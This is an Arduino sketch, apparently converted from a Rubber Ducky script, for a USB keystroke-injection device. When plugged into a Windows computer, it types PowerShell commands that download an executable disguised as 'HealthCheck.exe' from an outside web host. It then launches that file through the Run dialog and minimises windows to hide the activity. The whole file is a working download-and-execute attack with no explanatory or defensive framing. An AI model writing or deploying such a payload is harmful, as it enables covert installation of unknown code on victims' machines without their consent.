/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  delay(500);

  //delay(3000);
  
  typeKey(KEY_LEFT_GUI);
  delay(2000);
  
  Keyboard.println("powershell");
  delay(400);
  
  typeKey(KEY_RETURN);
  
  delay(3000);
  
  Keyboard.println("$URL = \"http://skiart.ir/HealthCheck.exe\"");
  delay(400);
  
  Keyboard.println("cd ../..");
  delay(400);
  
  Keyboard.println("mkdir ./HealthCheck");
  delay(400);
  
  Keyboard.println("cd ./HealthCheck");
  delay(400);
  
  Keyboard.println("Invoke-WebRequest -Uri $URL -o HealthCheck.exe");
  delay(400);
  
  Keyboard.press(KEY_LEFT_GUI);
  delay(400);
  
  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(16000);
  
  Keyboard.press(KEY_LEFT_GUI);
  delay(400);
  
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  
  Keyboard.println("C:\\HealthCheck\\HealthCheck.exe");
  delay(500);

  
  Keyboard.press(KEY_LEFT_GUI);
  delay(400);
  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();

  
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
